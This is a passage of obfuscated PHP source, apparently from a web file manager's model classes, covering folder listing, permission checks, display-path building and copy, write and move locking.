$ŸêØõàô = array_to_keyvalue_group($±üøŸÏÇ, $ÜÂÏÙ®½[183]); foreach ($¼ÓšĞ¾ë as &$¢ÙÏ†™å) { $¢ÙÏ†™å[$ÜÂÏÙ®½[89]] = array($ÜÂÏÙ®½[522] => 0, $ÜÂÏÙ®½[523] => 0, $ÜÂÏÙ®½[524] => 0); if (isset($ü ·›Åî[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]])) { $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[525]] = 1; $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[526]] = $ü ·›Åî[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]][$ÜÂÏÙ®½[32]]; } if ($Ö–‚ìÙ½ && $ÈÒ¬×ƒí && isset($Ö–‚ìÙ½[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]])) { $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[527]] = array(); foreach ($Ö–‚ìÙ½[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]] as $Â÷”ğ”Ú) { $Ü¤Ò§Íü = $ÈÒ¬×ƒí[$Â÷”ğ”Ú]; $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[527]][] = array($ÜÂÏÙ®½[528] => $Ü¤Ò§Íü[$ÜÂÏÙ®½[445]], $ÜÂÏÙ®½[464] => $Ü¤Ò§Íü[$ÜÂÏÙ®½[32]], $ÜÂÏÙ®½[529] => $Ü¤Ò§Íü[$ÜÂÏÙ®½[530]]); } } if ($ŸêØõàô && isset($ŸêØõàô[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]])) { $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[531]] = array(); foreach ($ŸêØõàô[$¢ÙÏ†™å[$ÜÂÏÙ®½[183]]] as $ø½à×Ö–) { $÷¦æË = $ÜÂÏÙ®½[532]; if ($ø½à×Ö–[$ÜÂÏÙ®½[533]] == $ÜÂÏÙ®½[90]) { $÷¦æË .= $ÜÂÏÙ®½[534]; } $¢ÙÏ†™å[$ÜÂÏÙ®½[89]][$ÜÂÏÙ®½[531]] = array_field_key($ø½à×Ö–, explode($ÜÂÏÙ®½[50], $÷¦æË)); } } } unset($¢ÙÏ†™å); return $¼ÓšĞ¾ë; } protected function _listAppendChildren(&$‘û¥£ìä, $³Æ£éŸß) { $àê’èÀ =& $_SERVER[Î‹ÃÂŞ„]; $­¨æ«Äş = array(); $ñ®ŠĞÂş = array($àê’èÀ[225] => 0, $àê’èÀ[226] => 0); foreach ($‘û¥£ìä as &$¡ø‚ŸÙ) { if (!$¡ø‚ŸÙ[$àê’èÀ[455]]) { continue; } $­¨æ«Äş[] = $¡ø‚ŸÙ[$àê’èÀ[183]]; } unset($¡ø‚ŸÙ); if (!$­¨æ«Äş) { return; } $ÜşÂß‡Š = array($àê’èÀ[182] => array($àê’èÀ[7], $­¨æ«Äş), $àê’èÀ[475] => 0); $¸ãñç§§ = array($àê’èÀ[182], $àê’èÀ[455], $àê’èÀ[535] => $àê’èÀ[536]); $ìÆ¢›³° = $this->field($¸ãñç§§)->where($ÜşÂß‡Š)->group($àê’èÀ[537])->select(); $‹İû¢Ó = array(); foreach ($ìÆ¢›³° as $õŸß£Îä) { $Ş™Ó—ƒ¥ = $õŸß£Îä[$àê’èÀ[182]]; $Ôˆî‡ = $õŸß£Îä[$àê’èÀ[455]] == $àê’èÀ[90] ? $àê’èÀ[226] : $àê’èÀ[225]; if (!isset($‹İû¢Ó[$Ş™Ó—ƒ¥])) { $‹İû¢Ó[$Ş™Ó—ƒ¥] = array($àê’èÀ[225] => 0, $àê’èÀ[226] => 0); } $‹İû¢Ó[$Ş™Ó—ƒ¥][$Ôˆî‡] += $õŸß£Îä[$àê’èÀ[536]]; } foreach ($‘û¥£ìä as &$¡ø‚ŸÙ) { if (!$¡ø‚ŸÙ[$àê’èÀ[455]]) { continue; } $İ‹‚Í€ø = is_array($‹İû¢Ó[$¡ø‚ŸÙ[$àê’èÀ[183]]]) ? $‹İû¢Ó[$¡ø‚ŸÙ[$àê’èÀ[183]]] : $ñ®ŠĞÂş; $¡ø‚ŸÙ[$àê’èÀ[226]] = $İ‹‚Í€ø[$àê’èÀ[226]]; $¡ø‚ŸÙ[$àê’èÀ[225]] = $İ‹‚Í€ø[$àê’èÀ[225]]; unset($¡ø‚ŸÙ[$àê’èÀ[456]]); } unset($¡ø‚ŸÙ); } protected function _listAppendAuth(&$Ú¨Á‡´) { $öÍÆÀ‰ª =& $_SERVER[Î‹ÃÂŞ„]; $ÚùĞô—ä = array(); foreach ($Ú¨Á‡´ as $ÄÉ¨Òß) { if ($ÄÉ¨Òß[$öÍÆÀ‰ª[180]] == self::TYPE_GROUP) { $ÚùĞô—ä[] = $ÄÉ¨Òß[$öÍÆÀ‰ª[183]]; } } if (!$ÚùĞô—ä) { return; } $Æé¥ê‹ = array_to_keyvalue($Ú¨Á‡´, $öÍÆÀ‰ª[183]); $ÜÀ•“äÄ = Model($öÍÆÀ‰ª[538])->getSourceList($ÚùĞô—ä, $Æé¥ê‹); $üêª÷–ğ = $GLOBALS[$öÍÆÀ‰ª[539]] == 1; foreach ($Ú¨Á‡´ as $æû¿ÄÕä => &$ÄÉ¨Òß) { $ÄÉ¨Òß[$öÍÆÀ‰ª[457]] = $ÜÀ•“äÄ[$ÄÉ¨Òß[$öÍÆÀ‰ª[183]]]; if (!$ÄÉ¨Òß[$öÍÆÀ‰ª[457]] && $ÄÉ¨Òß[$öÍÆÀ‰ª[180]] == self::TYPE_GROUP) { $ÄÉ¨Òß[$öÍÆÀ‰ª[457]] = Action($öÍÆÀ‰ª[540])->pathGroupAuthMake($ÄÉ¨Òß[$öÍÆÀ‰ª[541]]); if (!$ÄÉ¨Òß[$öÍÆÀ‰ª[457]] && !$üêª÷–ğ) { $ÄÉ¨Òß[$öÍÆÀ‰ª[219]] = !1; $ÄÉ¨Òß[$öÍÆÀ‰ª[218]] = !1; } } if ($ÄÉ¨Òß[$öÍÆÀ‰ª[457]]) { $ÄÉ¨Òß[$öÍÆÀ‰ª[219]] = AuthModel::authCheckEdit($ÄÉ¨Òß[$öÍÆÀ‰ª[457]][$öÍÆÀ‰ª[458]]); $ÄÉ¨Òß[$öÍÆÀ‰ª[218]] = AuthModel::authCheckView($ÄÉ¨Òß[$öÍÆÀ‰ª[457]][$öÍÆÀ‰ª[458]]); } $this->groupPathDisplay($ÄÉ¨Òß); } unset($ÄÉ¨Òß); } public function _listAppendAuthSecret(&$–½”ç¸°) { $ù‰àÒÄË =& $_SERVER[Î‹ÃÂŞ„]; if (Model($ù‰àÒÄË[478])->get($ù‰àÒÄË[542]) != $ù‰àÒÄË[90]) { return; } static $ ğ«ãƒ± = false; if (!$ ğ«ãƒ±) { $çÛ¾¸Í = Model($ù‰àÒÄË[543]); $÷üÕáãÀ = Model($ù‰àÒÄË[544]); $ ğ«ãƒ± = $÷üÕáãÀ->listData(); $ ğ«ãƒ± = array_to_keyvalue($ ğ«ãƒ±, $ù‰àÒÄË[183]); $ò×øŠ¼ = json_decode(Model($ù‰àÒÄË[478])->get($ù‰àÒÄË[545]), !0); $ò×øŠ¼ = array_to_keyvalue($ò×øŠ¼, $ù‰àÒÄË[445]); foreach ($ ğ«ãƒ± as $®ëö£” => $ÛĞÀÒÊ¼) { $Ïªüıı¶ = $ò×øŠ¼[$ÛĞÀÒÊ¼[$ù‰àÒÄË[546]]]; if (!$Ïªüıı¶) { $÷üÕáãÀ->remove($ÛĞÀÒÊ¼[$ù‰àÒÄË[445]]); unset($ ğ«ãƒ±[$®ëö£”]); continue; } $ÇĞíÕÛæ = $çÛ¾¸Í->listData($Ïªüıı¶[$ù‰àÒÄË[457]]); if (!$ÇĞíÕÛæ) { $÷üÕáãÀ->remove($ÛĞÀÒÊ¼[$ù‰àÒÄË[445]]); unset($ ğ«ãƒ±[$®ëö£”]); continue; } $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]] = $ÇĞíÕÛæ; $ÛĞÀÒÊ¼[$ù‰àÒÄË[547]] = $Ïªüıı¶; $ÛĞÀÒÊ¼[$ù‰àÒÄË[548]] = Model($ù‰àÒÄË[549])->getInfoSimpleOuter($ÛĞÀÒÊ¼[$ù‰àÒÄË[497]]); $ ğ«ãƒ±[$®ëö£”] = $ÛĞÀÒÊ¼; } } $ß™ù º = USER_ID; $¡÷¤ë˜ = array(); $¾‹Ì³ö¸ = $this->_listAppendPath($¡÷¤ë˜, !0); foreach ($–½”ç¸° as $®ëö£” => &$ÛĞÀÒÊ¼) { if (!is_array($ÛĞÀÒÊ¼[$ù‰àÒÄË[457]])) { continue; } if ($ÛĞÀÒÊ¼[$ù‰àÒÄË[180]] != $ù‰àÒÄË[550]) { continue; } if (isset($ ğ«ãƒ±[$ÛĞÀÒÊ¼[$ù‰àÒÄË[183]]])) { $ËÙ¢Íù = $ ğ«ãƒ±[$ÛĞÀÒÊ¼[$ù‰àÒÄË[183]]]; if (!is_array($ÛĞÀÒÊ¼[$ù‰àÒÄË[509]])) { $ÛĞÀÒÊ¼[$ù‰àÒÄË[509]] = array(); } $ÛĞÀÒÊ¼[$ù‰àÒÄË[509]][$ù‰àÒÄË[551]] = $ËÙ¢Íù[$ù‰àÒÄË[546]]; $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[552]] = $ËÙ¢Íù; $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[553]] = $ÛĞÀÒÊ¼[$ù‰àÒÄË[554]]; $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[555]] = $ù‰àÒÄË[90]; if ($ËÙ¢Íù[$ù‰àÒÄË[497]] != $ß™ù º) { $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[458]] = $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[458]] & $ËÙ¢Íù[$ù‰àÒÄË[457]][$ù‰àÒÄË[457]]; } continue; } $¢Úîì£ = $this->parentLevelArray($ÛĞÀÒÊ¼[$ù‰àÒÄË[556]]); $İ¼ÃÇó´ = array_reverse($¢Úîì£); foreach ($İ¼ÃÇó´ as $ô§ôˆ·· => $ç¡Å¹Èı) { if (!isset($ ğ«ãƒ±[$ç¡Å¹Èı])) { continue; } $ËÙ¢Íù = $ ğ«ãƒ±[$ç¡Å¹Èı]; $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[552]] = $ËÙ¢Íù; if ($ËÙ¢Íù[$ù‰àÒÄË[497]] != $ß™ù º) { $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[458]] = $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[458]] & $ËÙ¢Íù[$ù‰àÒÄË[457]][$ù‰àÒÄË[457]]; } $ñª¯Á¤— = $ù‰àÒÄË[12]; $« ‡îéÛ = count($¢Úîì£) - $ô§ôˆ··; for ($¼ßªÔ˜Ö = 0; $¼ßªÔ˜Ö < $« ‡îéÛ; $¼ßªÔ˜Ö++) { if (!isset($¾‹Ì³ö¸[$¢Úîì£[$¼ßªÔ˜Ö]])) { $ñª¯Á¤— = $ù‰àÒÄË[12]; break; } $ñª¯Á¤— = $ñª¯Á¤— . rtrim($¾‹Ì³ö¸[$¢Úîì£[$¼ßªÔ˜Ö]], $ù‰àÒÄË[8]) . $ù‰àÒÄË[8]; } $ÛĞÀÒÊ¼[$ù‰àÒÄË[457]][$ù‰àÒÄË[553]] = rtrim($ñª¯Á¤—, $ù‰àÒÄË[8]) . $ù‰àÒÄË[8]; break; } } unset($ÛĞÀÒÊ¼); } public function groupPathDisplay(&$¼“û§) { $ä®Ê£¦ =& $_SERVER[Î‹ÃÂŞ„]; if ($¼“û§[$ä®Ê£¦[180]] != self::TYPE_GROUP) { return; } $¼ÎÑ¥Ğ = Model($ä®Ê£¦[557])->getInfo($¼“û§[$ä®Ê£¦[541]]); $ÛÃñ¢™œ = $this->parentLevelArray($¼ÎÑ¥Ğ[$ä®Ê£¦[556]]); $ş¾âİç² = $ä®Ê£¦[12]; foreach ($ÛÃñ¢™œ as $½™š„ÚÎ) { $†ÂîÕ¸‚ = Model($ä®Ê£¦[557])->getInfo($½™š„ÚÎ); $ş¾âİç² .= $†ÂîÕ¸‚[$ä®Ê£¦[89]][$ä®Ê£¦[183]] . $ä®Ê£¦[50]; } $¼“û§[$ä®Ê£¦[558]] = $¼ÎÑ¥Ğ[$ä®Ê£¦[182]]; $¼“û§[$ä®Ê£¦[559]] = $¼ÎÑ¥Ğ[$ä®Ê£¦[556]]; $¼“û§[$ä®Ê£¦[560]] = $¼ÎÑ¥Ğ[$ä®Ê£¦[561]]; $¼“û§[$ä®Ê£¦[562]] = $ş¾âİç² . $¼ÎÑ¥Ğ[$ä®Ê£¦[89]][$ä®Ê£¦[183]]; } protected function _listAppendPath(&$ĞĞ«­Èõ, $´ª©“ù = false) { $ ·ÔÈû =& $_SERVER[Î‹ÃÂŞ„]; static $‹Â™¬š¬ = array(); $èËüá›™ = array(); $öÀèâï = array(); if ($´ª©“ù) { return $‹Â™¬š¬; } foreach ($ĞĞ«­Èõ as &$İ¯öÑÍ) { $¡œèšÖ° = $İ¯öÑÍ[$ ·ÔÈû[183]]; if ($İ¯öÑÍ[$ ·ÔÈû[455]] == $ ·ÔÈû[90] && $İ¯öÑÍ[$ ·ÔÈû[182]] != 0) { $‹Â™¬š¬[$¡œèšÖ°] = $İ¯öÑÍ[$ ·ÔÈû[32]]; } if ($İ¯öÑÍ[$ ·ÔÈû[455]] == $ ·ÔÈû[90] && $İ¯öÑÍ[$ ·ÔÈû[182]] == 0) { $‹Â™¬š¬[$¡œèšÖ°] = $this->_listAppendPathRoot($İ¯öÑÍ, array()); } if (isset($öÀèâï[$İ¯öÑÍ[$ ·ÔÈû[556]]])) { continue; } $öÀèâï[$İ¯öÑÍ[$ ·ÔÈû[556]]] = !0; $ìĞ†´Ê¿ = $this->parentLevelArray($İ¯öÑÍ[$ ·ÔÈû[556]]); foreach ($ìĞ†´Ê¿ as $’®¬Ä => $ïñØíø™) { if (isset($‹Â™¬š¬[$ïñØíø™])) { continue; } if ($’®¬Ä == 0) { $‹Â™¬š¬[$ïñØíø™] = $this->_listAppendPathRoot($İ¯öÑÍ, $ìĞ†´Ê¿); } if ($’®¬Ä != 0) { $èËüá›™[] = $ïñØíø™; } } } unset($İ¯öÑÍ); $èËüá›™ = array_unique($èËüá›™); if (count($èËüá›™) > 0) { $Ù©Û° = array($ ·ÔÈû[461] => array($ ·ÔÈû[462], $èËüá›™)); if (count($èËüá›™) == 1) { $óÎ¿•€ = $this->sourceInfo($èËüá›™[0]); $³øÌíƒ¡ = is_array($óÎ¿•€) ? array($óÎ¿•€) : !1; } else { $³øÌíƒ¡ = $this->field($ ·ÔÈû[563])->where($Ù©Û°)->select(); } if (!$³øÌíƒ¡) { $³øÌíƒ¡ = array(); } foreach ($³øÌíƒ¡ as $‘âŒÚ–á) { $‹Â™¬š¬[$‘âŒÚ–á[$ ·ÔÈû[183]]] = $‘âŒÚ–á[$ ·ÔÈû[32]]; } } $ÈÛò„ˆË = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¢â¶»Æ¿ = array(); foreach ($ĞĞ«­Èõ as &$İ¯öÑÍ) { $Ô’€®£ = $İ¯öÑÍ[$ ·ÔÈû[556]]; $¾ÁûÍÑ = $ ·ÔÈû[12]; if (isset($¢â¶»Æ¿[$Ô’€®£])) { $¾ÁûÍÑ = $¢â¶»Æ¿[$Ô’€®£]; } else { $ìĞ†´Ê¿ = $this->parentLevelArray($İ¯öÑÍ[$ ·ÔÈû[556]]); foreach ($ìĞ†´Ê¿ as $’®¬Ä => $ïñØíø™) { if (isset($‹Â™¬š¬[$ïñØíø™])) { $¾ÁûÍÑ .= $‹Â™¬š¬[$ïñØíø™] . $ ·ÔÈû[8]; } } $¢â¶»Æ¿[$Ô’€®£] = $¾ÁûÍÑ; } $¾ÁûÍÑ .= $İ¯öÑÍ[$ ·ÔÈû[32]]; if ($İ¯öÑÍ[$ ·ÔÈû[455]] == $ ·ÔÈû[90]) { $¾ÁûÍÑ .= $ ·ÔÈû[8]; } $İ¯öÑÍ[$ ·ÔÈû[554]] = str_replace($ ·ÔÈû[564], $ ·ÔÈû[8], $¾ÁûÍÑ); if ($İ¯öÑÍ[$ ·ÔÈû[182]] == $ ·ÔÈû[214]) { $İ¯öÑÍ[$ ·ÔÈû[32]] = trim($‹Â™¬š¬[$İ¯öÑÍ[$ ·ÔÈû[183]]], $ ·ÔÈû[8]); $İ¯öÑÍ[$ ·ÔÈû[554]] = $İ¯öÑÍ[$ ·ÔÈû[32]] . $ ·ÔÈû[8]; } if (intval($İ¯öÑÍ[$ ·ÔÈû[180]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($İ¯öÑÍ, $ìĞ†´Ê¿, $ÈÛò„ˆË); } } unset($İ¯öÑÍ); return $ĞĞ«­Èõ; } private function _listAppendPathRecycle(&$ÎÚº‹œ, $Àİ»Ú², $Óøı¨¢) { $è¾¼¶Îİ =& $_SERVER[Î‹ÃÂŞ„]; if (!in_array($Óøı¨¢, $Àİ»Ú²) && $ÎÚº‹œ[$è¾¼¶Îİ[183]] != $Óøı¨¢) { return; } $ÄÚ†¡ö„ = explode($è¾¼¶Îİ[8], trim($ÎÚº‹œ[$è¾¼¶Îİ[554]], $è¾¼¶Îİ[8])); $æÈ¥¾’ó = implode($è¾¼¶Îİ[8], array_slice($ÄÚ†¡ö„, 2)); $ÎÚº‹œ[$è¾¼¶Îİ[554]] = $è¾¼¶Îİ[8] . LNG($è¾¼¶Îİ[565]) . $è¾¼¶Îİ[8] . ltrim($æÈ¥¾’ó, $è¾¼¶Îİ[8]); $ÎÚº‹œ[$è¾¼¶Îİ[556]] = $è¾¼¶Îİ[566] . implode($è¾¼¶Îİ[50], array_slice($Àİ»Ú², 1)) . $è¾¼¶Îİ[50]; if ($ÎÚº‹œ[$è¾¼¶Îİ[183]] == $Óøı¨¢) { $ÎÚº‹œ[$è¾¼¶Îİ[556]] = $è¾¼¶Îİ[566]; $ÎÚº‹œ[$è¾¼¶Îİ[182]] = $è¾¼¶Îİ[214]; $ÎÚº‹œ[$è¾¼¶Îİ[32]] = LNG($è¾¼¶Îİ[565]); } $ÎÚº‹œ[$è¾¼¶Îİ[567]] = $è¾¼¶Îİ[568]; } protected function _listAppendPathRoot(&$ÓÕò„†ï, $å–’Öº½) { $”Ğ‘ =& $_SERVER[Î‹ÃÂŞ„]; static $¯ê»²÷“ = false; $£ë”­›Ï = $”Ğ‘[12]; if ($ÓÕò„†ï[$”Ğ‘[180]] == self::TYPE_USER) { if ($ÓÕò„†ï[$”Ğ‘[541]] == USER_ID) { $£ë”­›Ï = LNG($”Ğ‘[569]); if ($¯ê»²÷“ === !1) { $ƒêó¬‚¯ = Model($”Ğ‘[570])->getInfoFull(USER_ID); $¯ê»²÷“ = _get($ƒêó¬‚¯, $”Ğ‘[571], $”Ğ‘[12]); } if ($å–’Öº½ && $å–’Öº½[0] == $¯ê»²÷“ || !$å–’Öº½ && $ÓÕò„†ï[$”Ğ‘[183]] == $¯ê»²÷“) { $£ë”­›Ï = LNG($”Ğ‘[572]); $ÓÕò„†ï[$”Ğ‘[573]] = $”Ğ‘[574]; } if (!$å–’Öº½) { $ÓÕò„†ï[$”Ğ‘[32]] = $£ë”­›Ï; } } else { $ÓÕò„†ï[$”Ğ‘[575]] = Model($”Ğ‘[549])->getInfoSimpleOuter($ÓÕò„†ï[$”Ğ‘[541]]); $£ë”­›Ï = LNG($”Ğ‘[576]) . $”Ğ‘[165] . $ÓÕò„†ï[$”Ğ‘[575]][$”Ğ‘[32]] . $”Ğ‘[167]; } } else { if ($ÓÕò„†ï[$”Ğ‘[180]] == self::TYPE_GROUP) { $Úñıñ¢È = Model($”Ğ‘[557])->getInfoSimple($ÓÕò„†ï[$”Ğ‘[541]]); $£ë”­›Ï = $Úñıñ¢È[$”Ğ‘[32]]; } else { if ($ÓÕò„†ï[$”Ğ‘[180]] == self::TYPE_SYSTEM) { $£ë”­›Ï = $”Ğ‘[577]; } } } $£ë”­›Ï = $£ë”­›Ï ? $”Ğ‘[8] . $£ë”­›Ï . $”Ğ‘[8] : $”Ğ‘[8]; return $£ë”­›Ï; } protected function _listAppendUser(&$‚èè±åì) { $¿¹ïİŠö =& $_SERVER[Î‹ÃÂŞ„]; $ª‹ÓÓğ = array_to_keyvalue($‚èè±åì, $¿¹ïİŠö[12], $¿¹ïİŠö[497]); $ÔÌßû = array_to_keyvalue($‚èè±åì, $¿¹ïİŠö[12], $¿¹ïİŠö[499]); $Ä›­ì›œ = array_merge($ª‹ÓÓğ, $ÔÌßû); $¾Ù¨Ã „ = Model($¿¹ïİŠö[570])->userListInfo($Ä›­ì›œ); foreach ($‚èè±åì as &$Œ†ÍíêÔ) { $‘ÊÍÊÙ = $Œ†ÍíêÔ[$¿¹ïİŠö[497]]; $Œ†ÍíêÔ[$¿¹ïİŠö[497]] = $¾Ù¨Ã „[$‘ÊÍÊÙ] ? $¾Ù¨Ã „[$‘ÊÍÊÙ] : !1; $‘ÊÍÊÙ = $Œ†ÍíêÔ[$¿¹ïİŠö[499]]; $Œ†ÍíêÔ[$¿¹ïİŠö[499]] = $¾Ù¨Ã „[$‘ÊÍÊÙ] ? $¾Ù¨Ã „[$‘ÊÍÊÙ] : !1; if (isset($Œ†ÍíêÔ[$¿¹ïİŠö[509]]) && $Œ†ÍíêÔ[$¿¹ïİŠö[509]][$¿¹ïİŠö[578]]) { $­µºõ†Ş = $GLOBALS[$¿¹ïİŠö[6]][$¿¹ïİŠö[91]][$¿¹ïİŠö[579]]; if ($Œ†ÍíêÔ[$¿¹ïİŠö[509]][$¿¹ïİŠö[580]] <= time() - $­µºõ†Ş) { $this->metaSet($Œ†ÍíêÔ[$¿¹ïİŠö[183]], $¿¹ïİŠö[578], null); $this->metaSet($Œ†ÍíêÔ[$¿¹ïİŠö[183]], $¿¹ïİŠö[580], null); unset($Œ†ÍíêÔ[$¿¹ïİŠö[509]][$¿¹ïİŠö[578]]); continue; } $ÇŒ€¼¬à = $Œ†ÍíêÔ[$¿¹ïİŠö[509]][$¿¹ïİŠö[578]]; $Œ†ÍíêÔ[$¿¹ïİŠö[509]][$¿¹ïİŠö[581]] = Model($¿¹ïİŠö[570])->getInfoSimpleOuter($ÇŒ€¼¬à); } } unset($Œ†ÍíêÔ); } public function parentLevelArray($øœßÓ”·) { $Ëõ¯—İä =& $_SERVER[Î‹ÃÂŞ„]; $øœßÓ”· = explode($Ëõ¯—İä[50], trim($øœßÓ”·, $Ëõ¯—İä[50])); return array_remove_value($øœßÓ”·, $Ëõ¯—İä[214]); } public function listAll($‰¿†ßìû) { $ë ôı“º =& $_SERVER[Î‹ÃÂŞ„]; $³à“Ç’ = $this->sourceInfo($‰¿†ßìû); $»×³Æµ  = array($ë ôı“º[582] => array($ë ôı“º[583], $³à“Ç’[$ë ôı“º[556]] . $‰¿†ßìû . $ë ôı“º[584]), $ë ôı“º[585] => 0); $»à¨¼Ó = $ë ôı“º[586]; $“¨¶¼³’ = "\114\105\x46\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\x69\x6f\137\146\x69\154\145\x20\146\151\x6c\145\40\x6f\156\40\x73\x6f\x75\x72\x63\145\56\146\151\x6c\x65\111\104\40\75\40\146\x69\154\x65\x2e\x66\151\154\x65\111\x44"; $ùâ‹­ Ã = $this->alias($ë ôı“º[489])->field($»à¨¼Ó)->where($»×³Æµ )->join($“¨¶¼³’)->select(); $this->_listAppendAuth($ùâ‹­ Ã); $this->_listAppendUser($ùâ‹­ Ã); $this->_listAppendPath($ùâ‹­ Ã); $ùâ‹­ Ã = array_to_keyvalue($ùâ‹­ Ã, $ë ôı“º[183]); $‰ƒÙÎòˆ = "\57{$³à“Ç’[$ë ôı“º[32]]}\57"; $‰ƒÙÎòˆ = $‰ƒÙÎòˆ == $ë ôı“º[564] ? $ë ôı“º[8] : $‰ƒÙÎòˆ; $â†ïèñ = array(); foreach ($ùâ‹­ Ã as $Òé¤¶ûË => $£­İ‚ˆÇ) { $ÒÑ‚Á­ = $this->parentLevelArray($£­İ‚ˆÇ[$ë ôı“º[556]]); array_shift($ÒÑ‚Á­); $Ü¬â¨©• = $‰ƒÙÎòˆ; for ($ì»îğ§ê = 0; $ì»îğ§ê < count($ÒÑ‚Á­); $ì»îğ§ê++) { $Ü¬â¨©• .= $ùâ‹­ Ã[$ÒÑ‚Á­[$ì»îğ§ê]][$ë ôı“º[32]] . $ë ôı“º[8]; } $Ü¬â¨©• .= $£­İ‚ˆÇ[$ë ôı“º[32]]; if ($£­İ‚ˆÇ[$ë ôı“º[455]]) { $Ü¬â¨©• .= $ë ôı“º[8]; } $šìœÓí = array($ë ôı“º[465] => str_replace($ë ôı“º[564], $ë ôı“º[8], str_replace($ë ôı“º[564], $ë ôı“º[8], str_replace($ë ôı“º[564], $ë ôı“º[8], $Ü¬â¨©•))), $ë ôı“º[587] => intval($£­İ‚ˆÇ[$ë ôı“º[455]]), $ë ôı“º[588] => intval($£­İ‚ˆÇ[$ë ôı“º[78]]), $ë ôı“º[87] => intval($£­İ‚ˆÇ[$ë ôı“º[87]]), $ë ôı“º[89] => $this->pathInfoFilter($£­İ‚ˆÇ)); if (!$šìœÓí[$ë ôı“º[455]]) { $šìœÓí[$ë ôı“º[511]] = $£­İ‚ˆÇ[$ë ôı“º[511]]; } $â†ïèñ[] = $šìœÓí; } $â†ïèñ = array_sort_by($â†ïèñ, $ë ôı“º[86]); return $â†ïèñ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ìÕÌĞ­Å) { $ÛŠû˜×µ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÛŠû˜×µ[589], $ìÕÌĞ­Å); $î¹ÉóÏ© = 1; $this->_lockEvent($ìÕÌĞ­Å, array($ÛŠû˜×µ[590], $ÛŠû˜×µ[591]), $î¹ÉóÏ©); $this->_lockParent($ìÕÌĞ­Å, array($ÛŠû˜×µ[591]), $î¹ÉóÏ©); $this->_lockEvent($ìÕÌĞ­Å, array($ÛŠû˜×µ[592], $ÛŠû˜×µ[593]), $î¹ÉóÏ©); $this->_lockCheckEnd($ÛŠû˜×µ[589], $ìÕÌĞ­Å); } public function lockCopyEnd($éšÈôô¨) { $¶ñ¾ÔĞ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $ÚıÖ†îº = 0; $this->_lockEvent($éšÈôô¨, array($¶ñ¾ÔĞ[590], $¶ñ¾ÔĞ[591]), $ÚıÖ†îº); $this->_lockParent($éšÈôô¨, array($¶ñ¾ÔĞ[591]), $ÚıÖ†îº); $this->_lockEvent($éšÈôô¨, array($¶ñ¾ÔĞ[592], $¶ñ¾ÔĞ[593]), $ÚıÖ†îº); } public function lockWriteStart($ Âö·“¢, $’Ë ¯ = '') { $™Şæİœé =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $this->_lockCheck($™Şæİœé[590], $ Âö·“¢); $“”›Ğó = 1; $this->_lockKey($™Şæİœé[594] . $ Âö·“¢ . $™Şæİœé[10] . $’Ë ¯, $“”›Ğó); $this->_lockEvent($ Âö·“¢, array($™Şæİœé[589], $™Şæİœé[591]), $“”›Ğó); $this->_lockParent($ Âö·“¢, array($™Şæİœé[589], $™Şæİœé[591]), $“”›Ğó); $this->_lockCheckEnd($™Şæİœé[590], $ Âö·“¢); } public function lockWriteEnd($¨‹ĞäİÌ, $”ç¦¶İ¶ = '') { $¨ææÎ—‚ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $ƒ¦©ÍÌÊ = 0; $this->_lockKey($¨ææÎ—‚[594] . $¨‹ĞäİÌ . $¨ææÎ—‚[10] . $”ç¦¶İ¶, $ƒ¦©ÍÌÊ); $this->_lockEvent($¨‹ĞäİÌ, array($¨ææÎ—‚[589], $¨ææÎ—‚[591]), $ƒ¦©ÍÌÊ); $this->_lockParent($¨‹ĞäİÌ, array($¨ææÎ—‚[589], $¨ææÎ—‚[591]), $ƒ¦©ÍÌÊ); } public function lockMoveStart($ë¢ŸœÃ°) { $àÀÆÂîû =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $this->_lockCheck($àÀÆÂîû[591], $ë¢ŸœÃ°); $Ñûåã®« = 1; $this->_lockKey($àÀÆÂîû[595] . $ë¢ŸœÃ°, $Ñûåã®«); $this->_lockEvent($ë¢ŸœÃ°, array($àÀÆÂîû[589], $àÀÆÂîû[590]), $Ñûåã®«); $this->_lockParent($ë¢ŸœÃ°, array($àÀÆÂîû[589], $àÀÆÂîû[591]), $Ñûåã®«); $this->_lockEvent($ë¢ŸœÃ°, array($àÀÆÂîû[596], $àÀÆÂîû[592], $àÀÆÂîû[593]), $Ñûåã®«); $this->_lockCheckEnd($àÀÆÂîû[591], $ë¢ŸœÃ°); } public function lockMoveEnd($Ù±á¡ùÈ) { $ÍÏíÛÖ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->allowLock()) { return; } $Ô÷¶Æ’Ä = 0; $this->_lockKey($ÍÏíÛÖ[595] . $Ù±á¡ùÈ, $Ô÷¶Æ’Ä); $this->_lockEvent($Ù±á¡ùÈ, array($ÍÏíÛÖ[589], 